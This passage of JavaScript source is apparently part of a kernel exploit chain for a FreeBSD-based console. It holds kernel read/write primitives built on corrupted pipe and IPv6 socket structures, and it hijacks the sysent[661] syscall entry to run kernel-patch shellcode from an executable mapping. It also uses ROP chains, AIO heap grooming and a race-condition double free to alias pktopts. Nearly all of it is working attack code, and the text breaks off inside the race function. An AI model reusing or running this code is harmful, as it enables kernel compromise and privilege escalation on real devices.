    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
    if (kaddr === null || kaddr === undefined ||
        uaddr === null || uaddr === undefined ||
        len === null || len === undefined || len === 0n) {
        throw new Error("copyin: invalid arguments");
    }

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }

    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
};

// Helper functions
function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    const target_pid = BigInt(pid);
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

// Apply kernel patches via kexec using a single ROP chain
// This avoids returning to JS between critical operations
function apply_kernel_patches(fw_version) {
    try {
        // Get shellcode for this firmware
        const shellcode = get_kpatch_shellcode(fw_version);
        if (!shellcode) {
            logger.log("No kernel patch shellcode for FW " + fw_version);
            return false;
        }

        logger.log("Kernel patch shellcode: " + shellcode.length + " bytes");

        // Constants
        const PROT_READ = 0x1n;
        const PROT_WRITE = 0x2n;
        const PROT_EXEC = 0x4n;
        const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;

        const mapping_addr = 0x926100000n;  // Different from 0x920100000 to avoid conflicts
        const aligned_memsz = 0x10000n;

        // Get sysent[661] address and save original values
        const sysent_661_addr = kernel.addr.base + kernel_offset.SYSENT_661;
        logger.log("sysent[661] @ " + hex(sysent_661_addr));

        const sy_narg = kernel.read_dword(sysent_661_addr);
        const sy_call = kernel.read_qword(sysent_661_addr + 8n);
        const sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2Cn);

        logger.log("Original sy_narg: " + sy_narg);
        logger.log("Original sy_call: " + hex(sy_call));
        logger.log("Original sy_thrcnt: " + sy_thrcnt);

        // Calculate jmp rsi gadget address
        const jmp_rsi_gadget = kernel.addr.base + kernel_offset.JMP_RSI_GADGET;
        logger.log("jmp rsi gadget @ " + hex(jmp_rsi_gadget));

        // Allocate buffer for shellcode in userspace first
        const shellcode_buf = malloc(shellcode.length + 0x100);
        logger.log("Shellcode buffer @ " + hex(shellcode_buf));

        // Copy shellcode to userspace buffer
        for (let i = 0; i < shellcode.length; i++) {
            write8_uncompressed(shellcode_buf + BigInt(i), shellcode[i]);
        }

        // Verify first bytes
        const first_bytes = read32_uncompressed(shellcode_buf);
        logger.log("First bytes @ shellcode: " + hex(first_bytes));

        // Hijack sysent[661] to point to jmp rsi gadget
        logger.log("Hijacking sysent[661]...");
        kernel.write_dword(sysent_661_addr, 2n);           // sy_narg = 2
        kernel.write_qword(sysent_661_addr + 8n, jmp_rsi_gadget);  // sy_call = jmp rsi
        kernel.write_dword(sysent_661_addr + 0x2Cn, 1n);   // sy_thrcnt = 1
        logger.log("Hijacked sysent[661]");
        logger.flush();

        // Check if jitshm_create has a dedicated gadget
        const jitshm_num = Number(SYSCALL.jitshm_create);
        const jitshm_gadget = syscall_gadget_table[jitshm_num];
        logger.log("jitshm_create gadget: " + (jitshm_gadget ? hex(jitshm_gadget) : "NOT FOUND"));
        logger.flush();

        // Try using the standard syscall() function if gadget exists
        if (!jitshm_gadget) {
            logger.log("ERROR: jitshm_create gadget not found in libkernel");
            logger.log("Kernel patches require jitshm_create syscall support");
            return false;
        }

        // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
        logger.log("Calling jitshm_create...");
        logger.flush();
        const exec_handle = syscall(SYSCALL.jitshm_create, 0n, aligned_memsz, PROT_RWX);
        logger.log("jitshm_create handle: " + hex(exec_handle));

        if (exec_handle >= 0xffff800000000000n) {
            logger.log("ERROR: jitshm_create failed");
            kernel.write_dword(sysent_661_addr, sy_narg);
            kernel.write_qword(sysent_661_addr + 8n, sy_call);
            kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
            return false;
        }

        // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
        logger.log("Calling mmap...");
        logger.flush();
        const mmap_result = syscall(SYSCALL.mmap, mapping_addr, aligned_memsz, PROT_RWX, 0x11n, exec_handle, 0n);
        logger.log("mmap result: " + hex(mmap_result));

        if (mmap_result >= 0xffff800000000000n) {
            logger.log("ERROR: mmap failed");
            kernel.write_dword(sysent_661_addr, sy_narg);
            kernel.write_qword(sysent_661_addr + 8n, sy_call);
            kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
            return false;
        }

        // 3. Copy shellcode to mapped memory
        logger.log("Copying shellcode to " + hex(mapping_addr) + "...");
        for (let j = 0; j < shellcode.length; j++) {
            write8_uncompressed(mapping_addr + BigInt(j), shellcode[j]);
        }

        // Verify
        const verify_bytes = read32_uncompressed(mapping_addr);
        logger.log("First bytes @ mapped: " + hex(verify_bytes));
        logger.flush();

        // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
        logger.log("Calling kexec...");
        logger.flush();
        const kexec_result = syscall(SYSCALL.kexec, mapping_addr);
        logger.log("kexec returned: " + hex(kexec_result));

        // Restore original sysent[661]
        logger.log("Restoring sysent[661]...");
        kernel.write_dword(sysent_661_addr, sy_narg);
        kernel.write_qword(sysent_661_addr + 8n, sy_call);
        kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
        logger.log("Restored sysent[661]");

        logger.log("Kernel patches applied!");
        logger.flush();
        return true;

    } catch (e) {
        logger.log("apply_kernel_patches error: " + e.message);
        logger.log(e.stack);
        return false;
    }
}


/***** threading.js *****/

function wait_for(addr, threshold) {
    while (read64_uncompressed(addr) !== threshold) {
        nanosleep(1);
    }
}

// Get per-syscall gadget from syscall_gadget_table
// These gadgets have the form: mov eax, <num>; mov r10, rcx; syscall; ret
function get_syscall_gadget(syscall_num) {
    const num = Number(syscall_num);
    const gadget = syscall_gadget_table[num];
    if (!gadget) {
        throw new Error("No gadget for syscall " + num);
    }
    return gadget;
}

function pin_to_core(core) {
    const mask = malloc(0x10);
    write32_uncompressed(mask, BigInt(1 << core));
    syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, -1n, 0x10n, mask);
}

function get_core_index(mask_addr) {
    let num = Number(read32_uncompressed(mask_addr));
    let position = 0;
    while (num > 0) {
        num = num >>> 1;
        position++;
    }
    return position - 1;
}

function get_current_core() {
    const mask = malloc(0x10);
    syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, -1n, 0x10n, mask);
    return get_core_index(mask);
}

function set_rtprio(prio) {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, BigInt(prio));
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
}

function get_rtprio() {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, 0n);
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
    return read16_uncompressed(rtprio + 0x2n);
}

function new_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_socket error: " + hex(sd));
    }
    return sd
}

function new_tcp_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_tcp_socket error: " + hex(sd));
    }
    return sd
}

function set_sockopt(sd, level, optname, optval, optlen) {
    const result = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, BigInt(optlen));
    if (result === 0xffffffffffffffffn) {
        throw new Error("set_sockopt error: " + hex(result));
    }
    return result;
}

function get_sockopt(sd, level, optname, optval, optlen) {
    const len_ptr = malloc(4);
    write32_uncompressed(len_ptr, BigInt(optlen));
    const result = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, len_ptr);
    if (result === 0xffffffffffffffffn) {
        throw new Error("get_sockopt error: " + hex(result));
    }
    return read32_uncompressed(len_ptr);
}

function set_rthdr(sd, buf, len) {
    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdrs(sds) {
    for (let i = 0; i < sds.length; i++) {
        if (sds[i] !== 0xffffffffffffffffn) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0n, 0);
        }
    }
}

function build_rthdr(buf, size) {
    const len = ((Number(size) >> 3) - 1) & ~1;
    const actual_size = (len + 1) << 3;
        write8_uncompressed(buf, 0n);
        write8_uncompressed(buf + 1n, BigInt(len));
        write8_uncompressed(buf + 2n, 0n);
        write8_uncompressed(buf + 3n, BigInt(len >> 1));
    return actual_size;
}

function aton(ip_str) {
    const parts = ip_str.split('.').map(Number);
    return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
}

function aio_submit_cmd(cmd, reqs, num_reqs, priority, ids) {
    const result = syscall(SYSCALL.aio_submit_cmd, cmd, reqs, BigInt(num_reqs), priority, ids);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_submit_cmd error: " + hex(result));
    }
    return result;
}

function aio_multi_delete(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_delete error: " + hex(result));
    }
    return result;
}

function aio_multi_poll(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_poll error: " + hex(result));
    }
    return result;
}

function aio_multi_cancel(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_cancel error: " + hex(result));
    }
    return result;
}

function aio_multi_wait(ids, num_ids, states, mode, timeout) {
    const result = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), timeout);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_wait error: " + hex(result));
    }
    return result;
}

function make_reqs1(num_reqs) {
    const reqs = malloc(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        write32_uncompressed(reqs + BigInt(i * 0x28 + 0x20), -1n);
    }
    return reqs;
}

function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
    loops = loops || 1;
    cmd = cmd || AIO_CMD_READ;
    if (multi === undefined) multi = true;

    const step = 4 * (multi ? num_reqs : 1);
    const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0n);

    for (let i = 0; i < loops; i++) {
        aio_submit_cmd(final_cmd, reqs, num_reqs, 3n, ids + BigInt(i * step));
    }
}

function cancel_aios(ids, num_ids) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        aio_multi_cancel(ids + BigInt(i * 4 * len), len, errors);
    }

    if (rem > 0) {
        aio_multi_cancel(ids + BigInt(num_batches * 4 * len), rem, errors);
    }
}

function free_aios(ids, num_ids, do_cancel) {
    if (do_cancel === undefined) do_cancel = true;

    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        const addr = ids + BigInt(i * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, len, errors);
        }
        aio_multi_poll(addr, len, errors);
        aio_multi_delete(addr, len, errors);
    }

    if (rem > 0) {
        const addr = ids + BigInt(num_batches * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, rem, errors);
        }
        aio_multi_poll(addr, rem, errors);
        aio_multi_delete(addr, rem, errors);
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false);
}

function call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid) {
    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;

    // write(pipe_write_fd, pipe_buf, 1) - using per-syscall gadget
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = pipe_write_fd;
    fake_rop[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
    fake_rop[rop_i++] = pipe_buf;
    fake_rop[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
    fake_rop[rop_i++] = 1n;
    fake_rop[rop_i++] = get_syscall_gadget(SYSCALL.write);

    // sched_yield() - using per-syscall gadget
    fake_rop[rop_i++] = get_syscall_gadget(SYSCALL.sched_yield);

    // thr_suspend_ucontext(thr_tid) - using per-syscall gadget
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = thr_tid;
    fake_rop[rop_i++] = get_syscall_gadget(SYSCALL.thr_suspend_ucontext);

    // Store result (rax) to fake_rop_return
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = base_heap_add + fake_rop_return;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = 0x2000n;                 // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;

    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    rop_smash(obj_arr[0]);          // Call ROP
}

function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
    call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid);
    return read64(fake_rop_return);
}

function init_threading() {
    const jmpbuf = malloc(0x60);
    call(setjmp_addr, jmpbuf);
    saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
    saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));
}

function spawn_thread(fake_rop_race1_array) {
    const fake_rop_race1_addr = get_backing_store(fake_rop_race1_array);
    const jmpbuf = malloc(0x60);

    // FreeBSD amd64 jmp_buf layout:
    // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
    write64_uncompressed(jmpbuf + 0x00n, g.get('ret'));         // RIP - ret gadget
    write64_uncompressed(jmpbuf + 0x10n, fake_rop_race1_addr);  // RSP - pivot to ROP chain
    write32_uncompressed(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl)); // FPU control
    write32_uncompressed(jmpbuf + 0x44n, BigInt(saved_mxcsr));    // MXCSR

    const stack_size = 0x400n;
    const tls_size = 0x40n;

    const thr_new_args = malloc(0x80);
    const tid_addr = malloc(0x8);
    const cpid = malloc(0x8);
    const stack = malloc(Number(stack_size));
    const tls = malloc(Number(tls_size));

    write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
    write64_uncompressed(thr_new_args + 0x08n, jmpbuf);             // arg = jmpbuf
    write64_uncompressed(thr_new_args + 0x10n, stack);              // stack_base
    write64_uncompressed(thr_new_args + 0x18n, stack_size);         // stack_size
    write64_uncompressed(thr_new_args + 0x20n, tls);                // tls_base
    write64_uncompressed(thr_new_args + 0x28n, tls_size);           // tls_size
    write64_uncompressed(thr_new_args + 0x30n, tid_addr);           // child_tid (output)
    write64_uncompressed(thr_new_args + 0x38n, cpid);               // parent_tid (output)

    const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
    if (result !== 0n) {
        throw new Error("thr_new failed: " + hex(result));
    }

    return read64_uncompressed(tid_addr);
}

function setup() {
    try {

        init_threading();

        ready_signal = malloc(8);
        deletion_signal = malloc(8);
        pipe_buf = malloc(8);
        write64_uncompressed(ready_signal, 0n);
        write64_uncompressed(deletion_signal, 0n);

        prev_core = get_current_core();
        prev_rtprio = get_rtprio();

        pin_to_core(MAIN_CORE);
        set_rtprio(MAIN_RTPRIO);
        logger.log("  Pinned to core " + MAIN_CORE);

        const sockpair = malloc(8);
        if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair) !== 0n) {
            return false;
        }

        block_fd = read32_uncompressed(sockpair);
        unblock_fd = read32_uncompressed(sockpair + 4n);

        const block_reqs = malloc(0x28 * NUM_WORKERS);
        for (let i = 0; i < NUM_WORKERS; i++) {
            const offset = i * 0x28;
            write32_uncompressed(block_reqs + BigInt(offset + 0x08), 1n);
            write32_uncompressed(block_reqs + BigInt(offset + 0x20), block_fd);
        }

        const block_id_buf = malloc(4);
        if (aio_submit_cmd(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3n, block_id_buf) !== 0n) {
            return false;
        }

        block_id = read32_uncompressed(block_id_buf);
        logger.log("  AIO workers ready");

        const num_reqs = 3;
        const groom_reqs = make_reqs1(num_reqs);
        const groom_ids_addr = malloc(4 * NUM_GROOMS);

        spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
        cancel_aios(groom_ids_addr, NUM_GROOMS);

        groom_ids = [];
        for (let i = 0; i < NUM_GROOMS; i++) {
            groom_ids.push(Number(read32_uncompressed(groom_ids_addr + BigInt(i * 4))));
        }

        sds = [];
        for (let i = 0; i < NUM_SDS; i++) {
            const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd === 0xffffffffffffffffn) {
                throw new Error("socket alloc failed at sds[" + i + "] - reboot system");
            }
            sds.push(sd);
        }

        sds_alt = [];
        for (let i = 0; i < NUM_SDS_ALT; i++) {
            const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd === 0xffffffffffffffffn) {
                throw new Error("socket alloc failed at sds_alt[" + i + "] - reboot system");
            }
            sds_alt.push(sd);
        }
        logger.log("  Sockets allocated (" + NUM_SDS + " + " + NUM_SDS_ALT + ")");

        return true;

    } catch (e) {
        logger.log("  Setup failed: " + e.message);
        return false;
    }
}

function double_free_reqs2() {
    try {
        const server_addr = malloc(16);
        write8_uncompressed(server_addr + 1n, AF_INET);
        write16_uncompressed(server_addr + 2n, 0n);
        write32_uncompressed(server_addr + 4n, BigInt(aton("127.0.0.1")));

        const sd_listen = new_tcp_socket();

        const enable = malloc(4);
        write32_uncompressed(enable, 1n);
        set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);

        if (syscall(SYSCALL.bind, sd_listen, server_addr, 16n) !== 0n) {
            syscall(SYSCALL.close, sd_listen);
            return null;
        }

        const addr_len = malloc(4);
        write32_uncompressed(addr_len, 16n);
        if (syscall(SYSCALL.getsockname, sd_listen, server_addr, addr_len) !== 0n) {
            syscall(SYSCALL.close, sd_listen);
            return null;
        }

        if (syscall(SYSCALL.listen, sd_listen, 1n) !== 0n) {
            syscall(SYSCALL.close, sd_listen);
            return null;
        }

        const num_reqs = 3;
        const which_req = num_reqs - 1;
        const reqs = make_reqs1(num_reqs);
        const aio_ids = malloc(4 * num_reqs);
        const req_addr = aio_ids + BigInt(which_req * 4);
        const errors = malloc(4 * num_reqs);
        const cmd = AIO_CMD_MULTI_READ;

        for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
            const sd_client = new_tcp_socket();

            if (syscall(SYSCALL.connect, sd_client, server_addr, 16n) !== 0n) {
                syscall(SYSCALL.close, sd_client);
                continue;
            }

            const sd_conn = syscall(SYSCALL.accept, sd_listen, 0n, 0n);

            const linger_buf = malloc(8);
            write32_uncompressed(linger_buf, 1n);
            write32_uncompressed(linger_buf + 4n, 1n);
            set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);

            write32_uncompressed(reqs + BigInt(which_req * 0x28 + 0x20), sd_client);

            if (aio_submit_cmd(cmd, reqs, num_reqs, 3n, aio_ids) !== 0n) {
                syscall(SYSCALL.close, sd_client);
                syscall(SYSCALL.close, sd_conn);
                continue;
            }

            aio_multi_cancel(aio_ids, num_reqs, errors);
            aio_multi_poll(aio_ids, num_reqs, errors);
            syscall(SYSCALL.close, sd_client);

            const sd_pair = race_one(req_addr, sd_conn, sds);

            aio_multi_delete(aio_ids, num_reqs, errors);
            syscall(SYSCALL.close, sd_conn);

            if (sd_pair !== null) {
                logger.log("  Race won at attempt " + attempt);
                syscall(SYSCALL.close, sd_listen);
                return sd_pair;
            }
        }

        logger.log("  Race failed after " + NUM_RACES + " attempts");
        syscall(SYSCALL.close, sd_listen);
        return null;

    } catch (e) {
        logger.log("  Race error: " + e.message);
        return null;
    }
}

function make_aliased_rthdrs(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = malloc(size);
    const rsize = build_rthdr(buf, size);

    for (let loop = 1; loop <= NUM_ALIAS; loop++) {
        for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (sds[i-1] !== 0xffffffffffffffffn) {
                write32_uncompressed(buf + BigInt(marker_offset), BigInt(i));
                set_rthdr(sd, buf, rsize);
            }
        }

        for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (sds[i-1] !== 0xffffffffffffffffn) {
                get_rthdr(sd, buf, size);
                const marker = Number(read32_uncompressed(buf + BigInt(marker_offset)));

                if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                    const aliased_idx = marker - 1;
                    const aliased_sd = Number(sds[aliased_idx]);
                    if (aliased_idx >= 0 && aliased_idx < sds.length && sds[aliased_idx] !== 0xffffffffffffffffn) {
                        logger.log("  Aliased pktopts found");
                        const sd_pair = [sd, aliased_sd];
                        const max_idx = Math.max(i-1, aliased_idx);
                        const min_idx = Math.min(i-1, aliased_idx);
                        sds.splice(max_idx, 1);
                        sds.splice(min_idx, 1);
                        free_rthdrs(sds);
                        sds.push(new_socket());
                        sds.push(new_socket());
                        return sd_pair;
                    }
                }
            }
        }
    }
    return null;
}

function race_one(req_addr, tcp_sd, sds) {
    try {
        write64_uncompressed(ready_signal, 0n);
        write64_uncompressed(deletion_signal, 0n);

        const sce_errs = malloc(0x100);  // 8 bytes for errs + scratch for TCP_INFO
        write32_uncompressed(sce_errs, -1n);
        write32_uncompressed(sce_errs + 4n, -1n);

        const [pipe_read_fd, pipe_write_fd] = create_pipe();
        const fake_rop_race1 = new BigUint64Array(200);

        // fake_rop_race1[0] will be overwritten by longjmp, so skip it
        let rop_i = 1;

        {
            // Full ROP chain using syscall_gadget_table
            // Each gadget is: mov eax, <num>; mov r10, rcx; syscall; ret
            const cpu_mask = malloc(0x10);
            write16_uncompressed(cpu_mask, BigInt(1 << MAIN_CORE));

            // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
            fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
            fake_rop_race1[rop_i++] = 3n;               // CPU_LEVEL_WHICH
            fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
            fake_rop_race1[rop_i++] = 1n;               // CPU_WHICH_TID
            fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
            fake_rop_race1[rop_i++] = -1n;              // id = -1 (current thread)
            fake_rop_race1[rop_i++] = g.get('pop_rcx'); // pop rcx ; ret
            fake_rop_race1[rop_i++] = 0x10n;            // setsize
            fake_rop_race1[rop_i++] = g.get('pop_r8');  // pop r8 ; ret
            fake_rop_race1[rop_i++] = cpu_mask;
            fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.cpuset_setaffinity);

            const rtprio_buf = malloc(4);
            write16_uncompressed(rtprio_buf, PRI_REALTIME);
            write16_uncompressed(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));

            // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
            fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
            fake_rop_race1[rop_i++] = 1n;               // RTP_SET
            fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
            fake_rop_race1[rop_i++] = 0n;               // lwpid = 0 (current thread)
            fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
            fake_rop_race1[rop_i++] = rtprio_buf;
            fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.rtprio_thread);

            // Signal ready - write 1 to ready_signal
            fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
            fake_rop_race1[rop_i++] = ready_signal;
            fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
            fake_rop_race1[rop_i++] = 1n;
            fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

            // Read from pipe (blocks here) - read(pipe_read_fd, pipe_buf, 1)
            fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
            fake_rop_race1[rop_i++] = pipe_read_fd;
            fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
            fake_rop_race1[rop_i++] = pipe_buf;
            fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
            fake_rop_race1[rop_i++] = 1n;
            fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.read);

            // aio multi delete - aio_multi_delete(req_addr, 1, sce_errs + 4)
            fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
            fake_rop_race1[rop_i++] = req_addr;
            fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
            fake_rop_race1[rop_i++] = 1n;
            fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
            fake_rop_race1[rop_i++] = sce_errs + 4n;
            fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.aio_multi_delete);

            // Signal deletion - write 1 to deletion_signal
            fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
            fake_rop_race1[rop_i++] = deletion_signal;
            fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
            fake_rop_race1[rop_i++] = 1n;
            fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

            // Thread exit - thr_exit(0)
            fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
            fake_rop_race1[rop_i++] = 0n;
            fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.thr_exit);
        }

        const thr_tid = spawn_thread(fake_rop_race1);

        // Wait for thread to signal ready
        wait_for(ready_signal, 1n);

        call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);

        const scratch = sce_errs + 8n;  // Use offset for scratch space
        aio_multi_poll(req_addr, 1, scratch);
        const poll_res = read32_uncompressed(scratch);

        get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, scratch, size_tcp_info);
        const tcp_state = read8_uncompressed(scratch);

        let won_race = false;

